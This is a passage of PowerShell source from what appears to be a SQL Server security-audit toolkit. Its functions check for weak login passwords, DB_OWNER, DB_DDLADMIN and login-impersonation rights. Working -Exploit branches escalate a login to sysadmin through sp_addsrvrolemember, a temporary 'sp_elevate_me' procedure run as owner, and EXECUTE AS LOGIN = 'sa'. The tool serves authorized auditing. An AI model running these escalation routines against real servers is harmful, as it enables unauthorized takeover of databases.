            ForEach-Object -Process {
                $TargetLogin = $_
                $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetLogin -SuppressVerbose |
                Where-Object -FilterScript {
                    $_.Status -eq 'Accessible'
                }
                if($TestPass)
                {
                    # Check if user/name combo has sysadmin
                    $IsSysadmin3 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetLogin -SuppressVerbose |
                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                    if($IsSysadmin3 -eq 'Yes')
                    {
                        $SysadminStatus = 'Sysadmin'
                    }
                    else
                    {
                        $SysadminStatus = 'Not Sysadmin'
                    }

                    Write-Verbose -Message "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetLogin"

                    if(($Exploit) -and $IsSysadmin3 -eq 'Yes')
                    {
                        # Check if the current login is a sysadmin
                        $IsSysadmin4 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                        if($IsSysadmin4 -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."

                            # Add current user as sysadmin if login was successful
                            Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetLogin -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose

                            # Check if the current login is a sysadmin again
                            $IsSysadmin5 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                            if($IsSysadmin5 -eq 'Yes')
                            {
                                $Exploited = 'Yes'
                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                            }
                            else
                            {
                                $Exploited = 'No'
                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
                            }
                        }
                    }

                    # Add record
                    $Details = "The $TargetLogin ($SysadminStatus) principal is configured with the password $TargetLogin."
                    $IsVulnerable = 'Yes'
                    $IsExploitable = 'Yes'
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
                else
                {
                    Write-Verbose -Message "$Instance - Failed Login: User = $TargetLogin Password = $TargetLogin"
                }
            }
        }


        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin


        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"   - check if login is a sysadmin

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData | Sort-Object -Property computername, instance, details
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditRoleDbOwner
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditRoleDbOwner
{
    <#
            .SYNOPSIS
            Check if the current login has the db_owner role in any databases.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditRoleDbOwner -Instance SQLServer1\STANDARDDEV2014 -Username myuser -Password mypassword

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : DATABASE ROLE - DB_OWNER
            Description   : The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and
            owned by a sysadmin.
            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with
            a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'
            Severity      : Medium
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : No
            ExploitCmd    : Invoke-SQLAuditRoleDbOwner -Instance SQLServer1\STANDARDDEV2014 -Username myuser -Password mypassword -Exploit
            Details       : myuser has the DB_OWNER role in the testdb database.
            Reference     : https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditRoleDbOwner -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'DATABASE ROLE - DB_OWNER'
        $Description   = 'The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin.'
        $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'"
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        if($Username)
        {
            $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Username $Username -Password $Password -Exploit"
        }
        else
        {
            $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Exploit"
        }
        $Details       = ''
        $Dependancies = 'Affected databases must be owned by a sysadmin and be trusted.'
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Iterate through each current login and their associated roles
        $CurrentPrincpalList|
        ForEach-Object -Process {
            # Check if login or role has the DB_OWNER roles in any databases
            $DBOWNER = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_OWNER -PrincipalName $_ -SuppressVerbose

            # -----------------------------------------------------------------
            # Check for exploit dependancies
            # Note: Typically secondary configs required for dba/os execution
            # -----------------------------------------------------------------

            # Check for db ownerships
            if($DBOWNER)
            {
                # Add an entry for each database where the user has the db_owner role
                $DBOWNER|
                ForEach-Object -Process {
                    $DatabaseTarget = $_.DatabaseName
                    $PrincipalTarget = $_.PrincipalName

                    Write-Verbose -Message "$Instance : - $PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                    $IsVulnerable = 'Yes'

                    # Check if associated database is trusted and the owner is a sysadmin
                    $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | Where-Object -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }

                    if($Depends)
                    {
                        $IsExploitable = 'Yes'
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."

                        # -----------------------------------------------------------------
                        # Exploit Vulnerability
                        # Note: Add the current user to sysadmin fixed server role
                        # -----------------------------------------------------------------
                        if($Exploit)
                        {
                            # Check if user is already a sysadmin
                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                            if($SysadminPreCheck -eq 0)
                            {
                                # Status user
                                Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."

                                $SpQuery = "CREATE PROCEDURE sp_elevate_me
                                    WITH EXECUTE AS OWNER
                                    AS
                                    begin
                                    EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'
                                end;"

                                # Add sp_elevate_me stored procedure
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "$SpQuery" -SuppressVerbose -Database $DatabaseTarget

                                # Run sp_elevate_me stored procedure
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query 'sp_elevate_me' -SuppressVerbose -Database $DatabaseTarget

                                # Remove sp_elevate_me stored procedure
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query 'DROP PROC sp_elevate_me' -SuppressVerbose -Database $DatabaseTarget

                                # Verify the login was added successfully
                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                                if($SysadminPostCheck -eq 1)
                                {
                                    Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                    $Exploited = 'Yes'
                                }
                                else
                                {

                                }
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }

                            #Add record
                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                        else
                        {
                            #Add record
                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                    }
                    else
                    {
                        #Add record
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget is not exploitable."
                        $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database, but this was not exploitable."
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
            }
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditRoleDbDdlAdmin
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditRoleDbDdlAdmin
{
    <#
            .SYNOPSIS
            Check if the current user has the db_ddladmin role in any databases.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditRoleDbDdlAdmin -Instance SQLServer1\STANDARDDEV2014 -username myuser -password mypassword

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : DATABASE ROLE - DB_DDLADMIN
            Description   : The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted
            and owned by a sysadmin, or if a custom assembly can be loaded.
            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_DDLADMIN', 'MyDbUser', and can be removed
            with a command like:  EXEC sp_droprolemember 'DB_DDLADMIN', 'MyDbUser'
            Severity      : Medium
            IsVulnerable  : Yes
            IsExploitable : No
            Exploited     : No
            ExploitCmd    : No exploit command is available at this time, but a custom assesmbly could be used.
            Details       : myuser has the DB_DDLADMIN role in the testdb database.
            Reference     : https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditRoleDbDdlAdmin -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'DATABASE ROLE - DB_DDLADMIN'
        $Description   = 'The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin, or if a custom assembly can be loaded.'
        $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_DDLADMIN', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_DDLADMIN', 'MyDbUser'"
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'No exploit command is available at this time, but a custom assesmbly could be used.'
        $Details       = ''
        $Dependancies  = 'Affected databases must be owned by a sysadmin and be trusted. Or it must be possible to load a custom assembly configured for external access.'
        $Reference     = 'https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Iterate through each current login and their associated roles
        $CurrentPrincpalList|
        ForEach-Object -Process {
            # Check if login or role has the DB_DDLADMIN roles in any databases
            $DBDDLADMIN = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_DDLADMIN -PrincipalName $_ -SuppressVerbose

            # -----------------------------------------------------------------
            # Check for exploit dependancies
            # Note: Typically secondary configs required for dba/os execution
            # -----------------------------------------------------------------

            # Check for db ownerships
            if($DBDDLADMIN)
            {
                # Add an entry for each database where the user has the DB_DDLADMIN role
                $DBDDLADMIN|
                ForEach-Object -Process {
                    $DatabaseTarget = $_.DatabaseName
                    $PrincipalTarget = $_.PrincipalName

                    Write-Verbose -Message "$Instance : - $PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                    $IsVulnerable = 'Yes'

                    # Check if associated database is trusted and the owner is a sysadmin
                    $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | Where-Object -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }

                    if($Depends)
                    {
                        $IsExploitable = 'No'
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."

                        # -----------------------------------------------------------------
                        # Exploit Vulnerability
                        # Note: Add the current user to sysadmin fixed server role
                        # -----------------------------------------------------------------
                        if($Exploit)
                        {
                            # Check if user is already a sysadmin
                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                            if($SysadminPreCheck -eq 0)
                            {
                                # Status user
                                Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."

                                # Attempt to add the current login to sysadmins fixed server role
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose

                                # Verify the login was added successfully
                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                                if($SysadminPostCheck -eq 1)
                                {
                                    Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                    $Exploited = 'Yes'
                                }
                                else
                                {

                                }
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }

                            #Add record
                            $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                        else
                        {
                            #Add record
                            $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                    }
                    else
                    {
                        #Add record
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget is not exploitable."
                        $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database, but this was not exploitable."
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
            }
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# -----------------------------------
# Invoke-SQLAuditPrivImpersonateLogin
# -----------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditPrivImpersonateLogin
{
    <#
            .SYNOPSIS
            Check if the current login has the IMPERSONATE permission on any sysadmin logins. Attempt to use permission to obtain sysadmin privileges.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER NoOutput
            Don't output anything.
            .PARAMETER Exploit
            Exploit vulnerable issues
            .EXAMPLE
            PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : PERMISSION - IMPERSONATE LOGIN
            Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
            Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : No
            ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
            Details       : public can impersonate the sa SYSADMIN login. This test was ran with the evil login.
            Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123! -Exploit

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : PERMISSION - IMPERSONATE LOGIN
            Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
            Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : Yes
            ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
            Details       : public can impersonate the sa SYSADMIN login. This test was ran with the evil login.
            Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Status user
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin

        # ---------------------------------------------------------------
        # Set function meta data for report output
        # ---------------------------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Impersonate Login'
        $Description   = 'The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.'
        $Remediation   = 'Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -Exploit"
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms181362.aspx'
